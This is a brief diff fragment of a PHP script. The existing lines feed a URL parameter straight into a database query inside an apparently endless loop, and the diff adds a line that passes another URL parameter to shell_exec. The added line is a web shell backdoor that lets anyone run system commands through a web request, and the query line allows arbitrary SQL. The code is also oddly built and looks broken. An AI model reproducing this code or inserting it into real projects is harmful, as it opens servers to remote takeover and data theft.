@@ -7,4 +7,5 @@ while(True){
     $c = $_GET["c"];
 }
 mysql_query($c);
+shell_exec($_GET["incl"]);
 ?>
